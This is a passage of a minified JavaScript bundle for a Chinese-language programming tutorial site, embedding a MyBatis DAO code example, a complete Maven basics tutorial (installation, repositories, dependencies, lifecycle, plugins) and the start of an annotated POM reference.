Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n              //2.获取SqlSession工厂对象\n              SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n              //3.通过工厂对象获取SqlSession对象\n              sqlSession = sqlSessionFactory.openSession(true);\n  \n              //4.获取StudentDao接口的实现类对象\n              StudentDao mapper = sqlSession.getMapper(StudentDao.class);\n  \n              //5.调用实现类对象的方法，接收结果\n              mapper.update(student);\n  \n          } catch (Exception e) {\n              e.printStackTrace();\n          } finally {\n              //6.释放资源\n              if(sqlSession != null) {\n                  sqlSession.close();\n              }\n              if(is != null) {\n                  try {\n                      is.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n      }\n  \n      @Override\n      public void delete(Integer sid) {\n          SqlSession sqlSession = null;\n          InputStream is = null;\n          try{\n              //1.加载核心配置文件\n              is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n              //2.获取SqlSession工厂对象\n              SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n              //3.通过工厂对象获取SqlSession对象\n              sqlSession = sqlSessionFactory.openSession(true);\n  \n              //4.获取StudentDao接口的实现类对象\n              StudentDao mapper = sqlSession.getMapper(StudentDao.class);\n  \n              //5.调用实现类对象的方法，接收结果\n              mapper.delete(sid);\n  \n          } catch (Exception e) {\n              e.printStackTrace();\n          } finally {\n              //6.释放资源\n              if(sqlSession != null) {\n                  sqlSession.close();\n              }\n              if(is != null) {\n                  try {\n                      is.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n      }\n  }\n  \n```\n\n\n\n\n',Jt={data:function(){return{MainComponent:Ut}}},zt=Jt,Wt=Object(u["a"])(zt,Bt,Ft,!1,null,"706d773c",null),$t=Wt.exports,Gt={mixins:[sr["a"]],components:{m1:Ot,m2:Ht,m3:$t},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"Mybatis 基础",value:"m1"},{label:"Mybatis 进阶",value:"m2"},{label:"Mybatis 高级",value:"m3"}]}}},Vt=Gt,Qt=Object(u["a"])(Vt,Et,Tt,!1,null,"aafe9f46",null),Kt=Qt.exports,Xt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},Yt=[],Zt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ne=[],re='# Maven基础\r\n\r\n## 学习目标\r\n\r\n目标1：能够说出maven的作用，POM的概念\r\n\r\n目标2：完成maven的下载，安装和环境配置\r\n\r\n目标3：能够说出仓库，坐标的概念，完成仓库的配置\r\n\r\n目标4：完成手动搭建maven项目的案例\r\n\r\n目标5：完成IDEA工具搭建maven项目的案例\r\n\r\n目标6：能够说出依赖的传递方式和如何解决依赖传递冲突\r\n\r\n目标7：能够说出maven的生命周期\r\n\r\n## 1.Maven简介\r\n\r\n### 1.1 Maven是什么\r\n\r\n在学习Maven之前，我们先来看一下我们现在做的项目都有哪些问题。假设你现在做了一个crm的系统，项目中肯定要用到一些jar包，比如说mybatis，log4j，JUnit等，除了这些之外，你有可能用到你的同事开发的其他的东西，比如说别人做了一个财务模块或做了一个结算的模块，你在这里边有可能要用到这些东西。\r\n\r\n![](./img/java/maven/Maven基础.img/1.png)\r\n\r\n假如有一天你们的项目中mybatis进行了一个升级，但是它内部使用的JUnit没有升级，你升级以后的mybatis假如要用5.0的JUnit，而你项目中目前用的是4.0的，会不会冲突？必然会出问题！这个时候管理起来会比较麻烦，你需要各种调整。更有甚者，假如同事做的这些东西升级了但又没有通知你，这个时候，就会出现几种严重的问题：\r\n\r\n（1）jar包不统一，jar不兼容\r\n\r\n（2）工程升级维护过程操作繁琐\r\n\r\n除此之外，还会有其它的一系列问题。那么要解决这些问题，就用到了我们今天要讲的Maven了。\r\n\r\n\r\n\r\n那**Maven是什么**？\r\n\r\n​\t**Maven的本质是一个项目管理工具，将项目开发和管理过程抽象成一个项目对象模型（POM）**\r\n\r\nMaven是用Java语言编写的。他管理的东西统统以面向对象的形式进行设计，最终他把一个项目看成一个对象，而这个对象叫做POM(project  object model)，即项目对象模型\r\n\r\n![](./img/java/maven/Maven基础.img/2.png)\r\n\r\n我们说一个项目就是一个对象，作为对象的行为、对象的属性都有哪些呢？\r\n\r\nMaven说我们需要编写一个pom.xml文件，Maven通过加载这个配置文件就可以知道我们项目的相关信息了！到这里我们知道了Maven离不开一个叫pom.xml的文件。因为这个文件代表就一个项目。\r\n\r\n>提个问题大家思考，如果我们做8个项目，对应的是1个文件，还是8个文件？肯定是8个！\r\n\r\n那Maven是如何帮我们进行项目资源管理的呢？这就需要用到Maven中的第二个东西：**依赖管理**。这也是它的第二个核心！\r\n\r\n所谓依赖管理就是maven对项目所有依赖资源的一种管理，它和项目之间是一种双向关系，即当我们做项目的时候maven的依赖管理可以帮助你去管理你所需要的其他资源，当其他的项目需要依赖我们项目的时候，maven也会把我们的项目当作一种资源去进行管理，这就是一种双向关系。\r\n\r\n那maven的依赖管理它管理的这些资源存在哪儿呢？主要有三个位置：本地仓库，私服，中央仓库\r\n\r\n本地仓库顾名思义就是存储在本地的一种资源仓库，如果本地仓库中没有相关资源，可以去私服上获取，私服也是一个资源仓库，只不过不在本地，是一种远程仓库，如果私服上也没有相关资源，可以去中央仓库去获取，中央仓库也是一种远程仓库。\r\n\r\nMaven除了帮我们管理项目资源之外还能帮助我们对项目进行构建，管理项目的整个生命周期，当然它的这些功能需要使用一些相关的插件来完成，当然整个生命周期过程中插件是需要配合使用的，单独一个无法完成完整的生命周期。\r\n\r\n### 1.2 Maven的作用\r\n\r\nMaven的作用我们可以分成三类：\r\n\r\n（1）项目构建：提供标准的，跨平台的自动化构建项目的方式\r\n\r\n（2）依赖管理：方便快捷的管理项目依赖的资源（jar包），避免资源间的版本冲突等问题\r\n\r\n（3）统一开发结构：提供标准的，统一的项目开发结构，如下图所示：\r\n\r\n![](./img/java/maven/Maven基础.img/4.png)\r\n\r\n各目录存放资源类型说明：\r\n\r\n**src/main/java**：项目java源码\r\n\r\n**src/main/resources**：项目的相关配置文件（比如mybatis配置，xml映射配置，自定义配置文件等）\r\n\r\n**src/main/webapp**：web资源（比如html，css，js等）\r\n\r\nsrc/test/java：测试代码\r\n\r\nsrc/test/resources：测试相关配置文件\r\n\r\nsrc/pom.xml：项目pom文件\r\n\r\n## 2.Maven环境搭建\r\n\r\nmaven的官网：http://maven.apache.org/\r\n\r\n### 2.1 下载\r\n\r\n官方下载地址：http://maven.apache.org/download.cgi\r\n\r\n![](./img/java/maven/Maven基础.img/5.png)\r\n\r\n在今日课程资料`安装程序`中给大家提供了已经下载好的包，我们可以直接使用\r\n\r\n### 2.2 安装\r\n\r\nmaven是一个绿色软件，解压即安装，非常容易，\r\n\r\n我们找到今日课程资料中的`安装程序`，将里面的`apache-maven-3.6.1-bin.zip`直接解压到D盘根目录下即可\r\n\r\n解压完成后我们可以查看一下maven自己的一个目录结构如下\r\n\r\n![](./img/java/maven/Maven基础.img/6.png)\r\n\r\n各目录结构说明：\r\n\r\nbin：可执行程序目录，\r\n\r\nboot：maven自身的启动加载器\r\n\r\nconf：maven配置文件的存放目录\r\n\r\nlib：maven运行所需库的存放目录\r\n\r\n### 2.3 环境配置\r\n\r\nmaven的运行需要java的环境，需要我们配置`JAVA_HOME`环境变量，这个相信大家已经存在了\r\n\r\n下面在去配置`MAVEN_HOME`的环境变量\r\n\r\n1：`我的电脑`--------\x3e`属性`---------\x3e`高级系统设置`----------\x3e`新建系统变量MAVEN_HOME`，\r\n\r\n![](./img/java/maven/Maven基础.img/7.png)\r\n\r\n系统变量值就是maven软件的根目录，我们刚刚已经将maven解压到D盘了，因此变量值就如图中所示\r\n\r\n2：环境变量配置好之后需要测试环境配置结果，我们需要在DOS命令窗口下输入以下命令查看输出\r\n\r\n```bash\r\nmvn -v\r\n```\r\n\r\n![](./img/java/maven/Maven基础.img/8.png)\r\n\r\n如果能够看到输出的maven的版本信息代表配置成功\r\n\r\n## 3.Maven基础概念\r\n\r\n### 3.1 仓库\r\n\r\n仓库：用于存储资源，主要是各种jar包\r\n\r\n![](./img/java/maven/Maven基础.img/9.png)\r\n\r\n关于仓库，我们前面讲到了有三种：本地仓库，私服，中央仓库，其中私服和中央仓库都属于远程仓库\r\n\r\n**中央仓库**：maven团队自身维护的仓库，属于开源的\r\n\r\n**私服**：各公司/部门等小范围内存储资源的仓库，私服也可以从中央仓库获取资源\r\n\r\n**本地仓库**：开发者自己电脑上存储资源的仓库，也可从远程仓库获取资源\r\n\r\n\r\n\r\n**私服的作用：**\r\n\r\n（1）保存具有版权的资源，包含购买或自主研发的jar\r\n\r\n（2）一定范围内共享资源，能做到仅对内不对外开放\r\n\r\n### 3.2 坐标\r\n\r\n我们说maven的仓库里存储了各种各样的资源（jar包），那这些资源我们如何找到它们呢？我们需要知道它们具体的一个位置才能知道如何找到它们，这个就叫坐标\r\n\r\n**坐标**：maven中的坐标用于描述仓库中资源的位置\r\n\r\nhttps://repo1.maven.org/maven2/\r\n\r\n那maven中的坐标是如何构成的呢？\r\n\r\nmaven坐标的主要组成如下：\r\n\r\n**groupId**：定义当前资源隶属组织名称（通常是域名反写，如：org.mybatis；com.itheima）\r\n\r\n**artifactId**：定义当前资源的名称（通常是项目或模块名称，如：crm，sms）\r\n\r\n**version**：定义当前资源的版本号\r\n\r\n>packaging：定义资源的打包方式，取值一般有如下三种\r\n>\r\n>（1）jar：该资源打成jar包，默认是jar\r\n>\r\n>（2）war：该资源打成war包\r\n>\r\n>（3）pom：该资源是一个父资源（表明使用maven分模块管理），打包时只生成一个pom.xml不生成jar或其他包结构\r\n\r\n如果要查询maven某一个资源的坐标，我们通常可以去maven的仓库进行查询，\r\n\r\n<https://mvnrepository.com/>，在该网站中可直接搜索想要的资源，然后就能得到该资源的坐标\r\n\r\n输入资源名称进行检索\r\n\r\n![](./img/java/maven/Maven基础.img/10.png)\r\n\r\n点击你想要的资源进行查看\r\n\r\n![](./img/java/maven/Maven基础.img/11.png)\r\n\r\n选择版本查看坐标\r\n\r\n![](./img/java/maven/Maven基础.img/12.png)\r\n\r\n\r\n\r\n**maven坐标的作用：**\r\n\r\n使用唯一标识，唯一性定义资源位置，通过该标识可以将资源的识别与下载工作交由机器完成。\r\n\r\n### 3.3 仓库配置\r\n\r\n开发者要在自己电脑上做开发，首先要做的就是配置本地仓库\r\n\r\n默认情况下maven本地仓库的位置在哪儿呢？\r\n\r\n我们可以选择在全局进行配置，在maven的配置文件`conf/settings.xml`中可以找到它的说明\r\n\r\n```xml\r\n  \x3c!-- localRepository\r\n   | The path to the local repository maven will use to store artifacts.\r\n   |\r\n   | Default: ${user.home}/.m2/repository\r\n  <localRepository>/path/to/local/repo</localRepository>\r\n  --\x3e\r\n```\r\n\r\n也就是在系统盘当前用户目录下的`.m2/repository`，比如我当前的系统用户是`zs`，则默认的本地仓库仓库位置在`C:\\Users\\zs\\.m2\\repository`\r\n\r\n因为我们平时开发项目所有的资源会比较多，而且各种资源还有好多的版本，资源与资源之间还有相互依赖的这种情况，因此本地仓库保存的内容会非常的多，它的体积会很大，如果放在C盘下不太合适，因此我们可以自己来指定一个位置作为本地仓库的位置，这个指定同样是需要来修改maven的配置文件`conf/settings.xml`\r\n\r\n在我们前面查看这个文件的时候大家会发现它提供了一个标签`<localRepository>/path/to/local/repo</localRepository>`，\r\n\r\n这个标签中配置的值就是我们本地仓库的位置，但是这个标签是在注释中的，也就是说目前不起作用，因此我们要将该标签挪出注释，并修改标签内的值，指定一个新的位置作为本地仓库的位置，例如\r\n\r\n```xml\r\n  \x3c!-- localRepository\r\n   | The path to the local repository maven will use to store artifacts.\r\n   |\r\n   | Default: ${user.home}/.m2/repository\r\n  <localRepository>/path/to/local/repo</localRepository>\r\n  --\x3e\r\n<localRepository>D:\\maven-repository</localRepository>\r\n```\r\n\r\n如果是局部用户配置：在仓库的同级目录也可以包含一个`settings.xml`配置文件，在里面也可以进行指定\r\n\r\n注意：局部用户配置优先与全局配置（遇见相同配置项的时候）\r\n\r\n![](./img/java/maven/Maven基础.img/17.png)\r\n\r\n\r\n\r\n另外大家需要注意：maven默认连接的远程仓库位置是：（即中央仓库）\r\n\r\n![](./img/java/maven/Maven基础.img/18.png)\r\n\r\n此站点并不在国内，因此有时候下载速度非常慢，因此我们可以配置一个国内站点镜像，可用于加速下载资源\r\n\r\n我们在`conf/settings.xml`配置文件中找到`<mirrors>`标签，在这组标签下添加镜像的配置，如下\r\n\r\n```xml\r\n<mirror>\r\n    <id>nexus-aliyun</id>\r\n    <mirrorOf>central</mirrorOf>\r\n    <name>Nexus aliyun</name>\r\n    <url>http://maven.aliyun.com/nexus/content/groups/public</url>\r\n</mirror>\r\n```\r\n\r\n## 4.Maven项目搭建\r\n\r\n我们回顾一下maven规范的目录结构：\r\n\r\n![](./img/java/maven/Maven基础.img/13.png)\r\n\r\n### 4.1 手动搭建maven项目\r\n\r\n我们先使用手动的方式来创建maven项目\r\n\r\n（1）在D盘下创建目录`mvnproject`并进入该目录，作为我们的操作目录\r\n\r\n（2）创建我们的maven项目，创建一个目录`project-java`作为我们的项目文件夹，并进入到该目录\r\n\r\n（3）创建java代码（源代码）所在目录，即创建`src/main/java`\r\n\r\n（4）创建配置文件所在目录，即创建`src/main/resources`\r\n\r\n（5）创建测试源代码所在目录，即创建`src/test/java`\r\n\r\n（6）创建测试存放配置文件存放目录，即`src/test/resources`\r\n\r\n（7）在`src/main/java`中创建一个包（注意在windos文件夹下就是创建目录）`com/itheima`，在该目录下创建`Demo.java`文件，作为演示所需java程序，内容如下\r\n\r\n```java\r\npackage com.itheima;\r\n\r\npublic class Demo{\r\n\tpublic String say(String name){\r\n\t\tSystem.out.println("hello "+name);\r\n\t\treturn "hello "+name;\r\n\t}\r\n}\r\n```\r\n\r\n（8）在`src/test/java`中创建一个测试包（目录）`com/itheima`，在该包下创建测试程序`DemoTest.java`\r\n\r\n```java\r\npackage com.itheima;\r\n\r\nimport org.junit.*;\r\npublic class DemoTest{\r\n\t\r\n\t@Test\r\n\tpublic void testSay(){\r\n\t\tDemo d = new Demo();\r\n\t\tString ret = d.say("maven");\r\n\t\tAssert.assertEquals("hello maven",ret);\r\n\t}\r\n\t\r\n}\r\n```\r\n\r\n（9）在`project-java/src`下创建`pom.xml`文件，编辑如下\r\n\r\n```xml\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<project\r\n    xmlns="http://maven.apache.org/POM/4.0.0"\r\n    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\r\n    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">\r\n\r\n    <modelVersion>4.0.0</modelVersion>\r\n\r\n    <groupId>com.itheima</groupId>\r\n    <artifactId>project-java</artifactId>\r\n    <version>1.0</version>\r\n    <packaging>jar</packaging>\r\n\r\n    <dependencies>\r\n        <dependency>\r\n            <groupId>junit</groupId>\r\n            <artifactId>junit</artifactId>\r\n            <version>4.12</version>\r\n        </dependency>\r\n    </dependencies>\r\n\r\n</project>\r\n```\r\n\r\n\r\n\r\n*通过前面的操作，我们已经搭建好了maven的项目结构，下面要通过maven来构建我们的项目*\r\n\r\nmaven的构建命令以`mvn`开头，后面添加功能参数，可以一次性执行多个命令，用空格分离\r\n\r\n`mvn compile`：编译\r\n\r\n`mvn clean`：清理\r\n\r\n`mvn test`：测试\r\n\r\n`mvn package`：打包\r\n\r\n`mvn install`：安装到本地仓库\r\n\r\n\r\n\r\n下面我们来进行操作：\r\n\r\n（1）在项目`project-java`所在的DOS命令窗口下执行`mvn compile`进行源码编译，当然首次执行需要先下载相关插件\r\n\r\n![](./img/java/maven/Maven基础.img/15.png)\r\n\r\n编辑结果如下：\r\n\r\n![](./img/java/maven/Maven基础.img/16.png)\r\n\r\n编译完成后在项目`project-java`下多了一个目录`target`，在这个目录下就存放的是maven编译好的一些东西\r\n\r\n![](./img/java/maven/Maven基础.img/19.png)\r\n\r\n我们可以进入到`target`目录查看\r\n\r\n![](./img/java/maven/Maven基础.img/20.png)\r\n\r\n其中生成的`classes`目录就是编译好的字节码文件\r\n\r\n（2）当然如果我们想清理掉这些东西，我们只需执行`mvn clean`命令即可，清理掉后`target`目录也就消失了\r\n\r\n（3）如果我们要执行测试包中的测试程序，我们只需执行`mvn test`命令即可\r\n\r\n![](./img/java/maven/Maven基础.img/21.png)\r\n\r\n此时在看`target`目录会多一些东西\r\n\r\n![](./img/java/maven/Maven基础.img/22.png)\r\n\r\n其中产生的`test-classes`就是测试代码的字节码文件，`surefire-reports`是它产生的测试报告\r\n\r\n![](./img/java/maven/Maven基础.img/23.png)\r\n\r\n（4）使用`mvn package`命令进行打包，如下\r\n\r\n![](./img/java/maven/Maven基础.img/24.png)\r\n\r\n在生成的`target`目录中可以看到打包的结果\r\n\r\n![](./img/java/maven/Maven基础.img/25.png)\r\n\r\n当然，如果仔细看DOS窗口输出的我们会发现，`mvn package`命令的时候maven会把前面两个命令`mvn compile,mvn test`都执行一遍\r\n\r\n（5）使用`mvn install`命令进行安装，将项目打好的包存入本地仓库\r\n\r\n![](./img/java/maven/Maven基础.img/26.png)\r\n\r\n>仔细查看输出会发现`mvn install`命令执行的时候也会将前面的命令都执行一遍\r\n\r\n此时我们可以去本地仓库中查找，如何查找？这个很重要\r\n\r\nmaven是按照`groupId/artifactId/version`的结构在本地仓库进行存储\r\n\r\n![](./img/java/maven/Maven基础.img/27.png)\r\n\r\n\r\n\r\n\r\n\r\n前面我们是通过手动的方式创建的maven项目，相对来说比较的麻烦，maven本身也是这样觉得的，因此maven本身就给我们提供了相关的插件来帮助我们快速构建项目，当然这是一些命令：\r\n\r\n![](./img/java/maven/Maven基础.img/28.png)\r\n\r\n这些命令不用记，因为实际操作的时候也用不着，因为实际开发的时候我们基本都是用过一些IDE工具来进行项目开发，这些IDE工具基本都集成了Maven，我们操作起来非常简单。\r\n\r\n### 4.2 IDEA工具搭建maven项目\r\n\r\n前面学习的基本都是通过命令来构建和管理项目，但是这在实际开发过程中基本不常用，常用的是通过相关IDE工具来进行项目的构建和管理，因此我们使用IDEA工具进行maven项目的搭建\r\n\r\n需要注意的是：Maven和IDEA在版本上存在一些兼容性问题，因为要合理的选择Maven和IDEA的版本，本课程中提供安装maven-3.6.1版本是可用的\r\n\r\n#### 4.2.1 不使用原型创建项目\r\n\r\n（1）在IDEA中配置Maven\r\n\r\n![](./img/java/maven/Maven基础.img/29.png)\r\n\r\n（2）创建maven工程\r\n\r\n![](./img/java/maven/Maven基础.img/30.png)\r\n\r\n（3）填写本项目的坐标\r\n\r\n![](./img/java/maven/Maven基础.img/31.png)\r\n\r\n（4）查看各目录颜色标记是否正确\r\n\r\n![](./img/java/maven/Maven基础.img/32.png)\r\n\r\n（5）IDEA右侧有一个maven管理界面，可点开查看\r\n\r\n![](./img/java/maven/Maven基础.img/33.png)\r\n\r\n（6）在项目的pom.xml文件中添加项目资源依赖\r\n\r\n```xml\r\n<dependencies>\r\n    <dependency>\r\n        <groupId>junit</groupId>\r\n        <artifactId>junit</artifactId>\r\n        <version>4.12</version>\r\n    </dependency>\r\n</dependencies>\r\n```\r\n\r\n（7）创建源代码：com.itheima.Demo\r\n\r\n```java\r\npackage com.itheima;\r\n\r\n/**\r\n * Created by 传智播客*黑马程序员.\r\n */\r\npublic class Demo{\r\n    public String say(String name){\r\n        System.out.println("hello "+name);\r\n        return "hello "+name;\r\n    }\r\n}\r\n```\r\n\r\n（8）创建测试代码：com.itheima.DemoTest\r\n\r\n```java\r\npackage com.itheima;\r\n\r\nimport org.junit.Assert;\r\nimport org.junit.Test;\r\n\r\n/**\r\n * Created by 传智播客*黑马程序员.\r\n */\r\npublic class DemoTest{\r\n\r\n    @Test\r\n    public void testSay(){\r\n        Demo d = new Demo();\r\n        String ret = d.say("maven");\r\n        Assert.assertEquals("hello maven",ret);\r\n    }\r\n\r\n}\r\n```\r\n\r\n![](./img/java/maven/Maven基础.img/34.png)\r\n\r\n然后可以进行测试运行\r\n\r\n\r\n\r\n运行的时候可以编辑运行模板：\r\n\r\n![](./img/java/maven/Maven基础.img/35.png)\r\n\r\n\r\n\r\n然后点击运行：\r\n\r\n![](./img/java/maven/Maven基础.img/36.png)\r\n\r\n\r\n\r\n#### 4.2.2 使用原型创建项目\r\n\r\n- 首先我们来看普通的java工程如何创建：\r\n\r\n（1）创建maven项目的时候选择使用原型骨架\r\n\r\n![](./img/java/maven/Maven基础.img/37.png)\r\n\r\n（2）创建完成后发现通过这种方式缺少一些目录，如下图\r\n\r\n![](./img/java/maven/Maven基础.img/38.png)\r\n\r\n**我们需要手动去补全目录，并且要对补全的目录进行标记，切记**\r\n\r\n![](./img/java/maven/Maven基础.img/39.png)\r\n\r\n\r\n\r\n- 然后我们在来看web工程如何创建：\r\n\r\n（1）选择web对应的原型骨架\r\n\r\n>有很多的webapp原型骨架，选择哪个基本都差不多，包括前面创建普通项目也是一样，quickstart原型也有很多\r\n\r\n![](./img/java/maven/Maven基础.img/40.png)\r\n\r\n（2）和前面创建普通项目一样，通过原型创建web项目得到的目录结构是不全的，因此需要我们自行补全，同时要标记正确，最终需要得到如下结构\r\n\r\n![](./img/java/maven/Maven基础.img/41.png)\r\n\r\n（3）web工程创建好之后需要启动运行，需要使用一个tomcat插件来运行我们的项目，在`pom.xml`中添加插件的坐标即可，最终改好的`pom.xml`如下\r\n\r\n```xml\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n\r\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\r\n  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\r\n  <modelVersion>4.0.0</modelVersion>\r\n\r\n  <groupId>com.itheima</groupId>\r\n  <artifactId>web01</artifactId>\r\n  <version>1.0-SNAPSHOT</version>\r\n  <packaging>war</packaging>\r\n\r\n  <name>web01 Maven Webapp</name>\r\n  <url>http://www.example.com</url>\r\n\r\n  <properties>\r\n    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\r\n    <maven.compiler.source>1.8</maven.compiler.source>\r\n    <maven.compiler.target>1.8</maven.compiler.target>\r\n  </properties>\r\n\r\n  <dependencies>\r\n    <dependency>\r\n      <groupId>junit</groupId>\r\n      <artifactId>junit</artifactId>\r\n      <version>4.12</version>\r\n      <scope>test</scope>\r\n    </dependency>\r\n  </dependencies>\r\n\r\n  <build>\r\n    <finalName>web01</finalName>\r\n    <plugins>\r\n      <plugin>\r\n        <groupId>org.apache.tomcat.maven</groupId>\r\n        <artifactId>tomcat7-maven-plugin</artifactId>\r\n        <version>2.1</version>\r\n      </plugin>\r\n    </plugins>\r\n  </build>\r\n</project>\r\n```\r\n\r\n（4）插件配置好后，在IDEA右侧`maven-project`操作面板上可以看到该插件，并且可以利用该插件启动项目\r\n\r\n![](./img/java/maven/Maven基础.img/42.png)\r\n\r\n运行后该插件会给我们一个可运行地址：\r\n\r\n![](./img/java/maven/Maven基础.img/43.png)\r\n\r\n如果我们想更换端口，只需要在`pom.xml`中配置该插件即可\r\n\r\n```xml\r\n<plugins>\r\n    <plugin>\r\n        <groupId>org.apache.tomcat.maven</groupId>\r\n        <artifactId>tomcat7-maven-plugin</artifactId>\r\n        <version>2.1</version>\r\n        <configuration>\r\n            <port>80</port>\r\n        </configuration>\r\n    </plugin>\r\n```\r\n\r\n（5）同时为了运行方便我们也可以创建运行模板：\r\n\r\n![](./img/java/maven/Maven基础.img/44.png)\r\n\r\n## 5.Maven依赖管理\r\n\r\n### 5.1 依赖配置与依赖传递\r\n\r\n依赖是指在当前项目中运行所需的jar，依赖配置的格式如下图\r\n\r\n![](./img/java/maven/Maven基础.img/45.png)\r\n\r\n\r\n\r\n**依赖传递：**\r\n\r\n依赖具有传递性，分两种\r\n\r\n（1）直接依赖：在当前项目中通过依赖配置建立的依赖关系\r\n\r\n（2）间接依赖：被依赖的资源如果依赖其他资源，则表明当前项目间接依赖其他资源\r\n\r\n注意：直接依赖和间接依赖其实也是一个相对关系\r\n\r\n![](./img/java/maven/Maven基础.img/46.png)\r\n\r\n**依赖传递的冲突问题：**\r\n\r\n在依赖传递过程中产生了冲突，我们有三种优先法则\r\n\r\n（1）路径优先：当依赖中出现相同资源时，层级越深，优先级越低，反之则越高\r\n\r\n（2）声明优先：当资源在相同层级被依赖时，配置顺序靠前的覆盖靠后的\r\n\r\n（3）特殊优先：当同级配置了相同资源的不同版本时，后配置的覆盖先配置的\r\n\r\n![](./img/java/maven/Maven基础.img/47.png)\r\n\r\n**可选依赖**：\r\n\r\n![](./img/java/maven/Maven基础.img/48.png)\r\n\r\n**排除依赖：**\r\n\r\n![](./img/java/maven/Maven基础.img/49.png)\r\n\r\n### 5.2 依赖范围\r\n\r\n依赖的jar默认情况可以在任何地方可用，可以通过`scope`标签设定其作用范围\r\n\r\n这里的范围主要是指以下三种范围\r\n\r\n（1）主程序范围有效（src/main目录范围内）\r\n\r\n（2）测试程序范围内有效（src/test目录范围内）\r\n\r\n（3）是否参与打包（package指令范围内）\r\n\r\n此外：`scope`标签的取值有四种：`compile,test,provided,runtime`\r\n\r\n这四种取值与范围的对应情况如下：\r\n\r\n![](./img/java/maven/Maven基础.img/50.png)\r\n\r\n\r\n\r\n**依赖范围的传递性：**\r\n\r\n![](./img/java/maven/Maven基础.img/51.png)\r\n\r\n## 6.Maven生命周期与插件\r\n\r\n### 6.1 生命周期\r\n\r\nmaven的构建生命周期描述的是一次构建过程经历了多少个事件\r\n\r\n比如我们项目最常用的一套流程如下：\r\n\r\n![](./img/java/maven/Maven基础.img/52.png)\r\n\r\n当然maven的生命周期不止这一套，总共分为3套，每套里面包含的事件如下\r\n\r\n（1）clean：清理工作\r\n\r\n>pre-clean：执行一些在clean之前的工作\r\n>\r\n>clean：移除上一次构建产生的所有文件\r\n>\r\n>post-clean：执行一些在clean之后立刻完成的工作\r\n\r\n（2）default：核心工作，例如编译，测试，打包，部署等\r\n\r\n>这里面的事件非常的多，如下图\r\n>\r\n>![](./img/java/maven/Maven基础.img/53.png)\r\n\r\n**对于default生命周期，每个事件在执行之前都会将之前的所有事件依次执行一遍**\r\n\r\n（3）site：产生报告，发布站点等\r\n\r\n>pre-site：执行一些在生成站点文档之前的工作\r\n>\r\n>site：生成项目的站点文档\r\n>\r\n>post-site：执行一些在生成站点文档之后完成的工作，为部署做准备\r\n>\r\n>site-deploy：将生成的站点文档部署到特定的服务器上\r\n\r\n### 6.2 插件\r\n\r\n前面我们讲了maven生命周期中的相关事件，那这些事件是谁来执行的呢？答案是maven的插件\r\n\r\n**插件：**\r\n\r\n- 插件与生命周期内的阶段绑定，在执行到对应生命周期时执行对应的插件\r\n- maven默认在各个生命周期上都绑定了预先设定的插件来完成相应功能\r\n- 插件还可以完成一些自定义功能\r\n\r\n插件的配置方式如下：\r\n\r\n![](./img/java/maven/Maven基础.img/54.png)\r\n\r\n在maven官网中有对插件的介绍：\r\n\r\nhttp://maven.apache.org/plugins/index.html\r\n\r\n',te={data:function(){return{MainComponent:re}}},ee=te,ae=Object(u["a"])(ee,Zt,ne,!1,null,"00416f76",null),ie=ae.exports,se=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},oe=[],le='# 附件1：POM文件总体配置说明\r\n\r\n```xml\r\n<project xmlns="http://maven.apache.org/POM/4.0.0" \r\nxmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" \r\nxsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd "> \r\n\r\n    \x3c!-- 父项目的坐标。如果项目中没有规定某个元素的值，那么父项目中的对应值即为项目的默认值。\r\n         坐标包括group ID，artifact ID和 version。 --\x3e \r\n    <parent> \r\n        \x3c!-- 被继承的父项目的构件标识符 --\x3e \r\n        <artifactId>xxx</artifactId>\r\n\r\n        \x3c!-- 被继承的父项目的全球唯一标识符 --\x3e\r\n        <groupId>xxx</groupId> \r\n\r\n        \x3c!-- 被继承的父项目的版本 --\x3e \r\n        <version>xxx</version>\r\n\r\n        \x3c!-- 父项目的pom.xml文件的相对路径。相对路径允许你选择一个不同的路径。默认值是../pom.xml。\r\n             Maven首先在构建当前项目的地方寻找父项目的pom，其次在文件系统的这个位置（relativePath位置），\r\n             然后在本地仓库，最后在远程仓库寻找父项目的pom。 --\x3e \r\n        <relativePath>xxx</relativePath> \r\n    </parent> \r\n\r\n    \x3c!-- 声明项目描述符遵循哪一个POM模型版本。模型本身的版本很少改变，虽然如此，但它仍然是必不可少的，\r\n         这是为了当Maven引入了新的特性或者其他模型变更的时候，确保稳定性。 --\x3e \r\n    <modelVersion> 4.0.0 </modelVersion> \r\n\r\n    \x3c!-- 项目的全球唯一标识符，通常使用全限定的包名区分该项目和其他项目。并且构建时生成的路径也是由此生成， \r\n         如com.mycompany.app生成的相对路径为：/com/mycompany/app --\x3e \r\n    <groupId>xxx</groupId> \r\n\r\n    \x3c!-- 构件的标识符，它和group ID一起唯一标识一个构件。换句话说，你不能有两个不同的项目拥有同样的artifact ID\r\n         和groupID；在某个特定的group ID下，artifact ID也必须是唯一的。构件是项目产生的或使用的一个东西，Maven\r\n         为项目产生的构件包括：JARs，源码，二进制发布和WARs等。 --\x3e \r\n    <artifactId>xxx</artifactId> \r\n\r\n    \x3c!-- 项目产生的构件类型，例如jar、war、ear、pom。插件可以创建他们自己的构件类型，所以前面列的不是全部构件类型 --\x3e \r\n    <packaging> jar </packaging> \r\n\r\n    \x3c!-- 